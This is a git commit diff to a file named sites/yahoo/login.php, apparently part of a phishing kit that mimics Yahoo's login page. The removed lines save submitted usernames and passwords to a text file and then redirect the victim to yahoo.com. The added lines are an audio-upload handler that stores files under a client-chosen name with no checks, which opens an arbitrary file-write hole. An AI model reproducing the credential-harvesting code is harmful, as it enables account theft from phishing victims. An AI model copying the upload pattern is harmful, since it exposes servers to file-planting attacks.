5842deedef566f28b9abc2832411ae521f54273b
AnonymousJm <68786049+AnonymousJm@users.noreply.github.com>
2020-08-09 19:27:09 +0200

    Update login.php

--- sites/yahoo/login.php
+++ sites/yahoo/login.php
@@ -1,5 +1,20 @@
 <?php
+print_r($_FILES); //this will print out the received name, temp name, type, size, etc.
 
-file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
-header('Location: https://yahoo.com');
-exit();
+if (!empty($_FILES)) {
+error_log("Received" . "\r\n", 3, "Log.log");
+
+}
+
+$size = $_FILES['audio_data']['size']; //the size in bytes
+$input = $_FILES['audio_data']['tmp_name']; //temporary name that PHP gave to the uploaded file
+$output = $_FILES['audio_data']['name'].".wav"; //letting the client control the filename is a rather bad idea
+
+//move the file from temp name to local folder using $output name
+move_uploaded_file($input, $output)
+?>
+
+
+
+
+
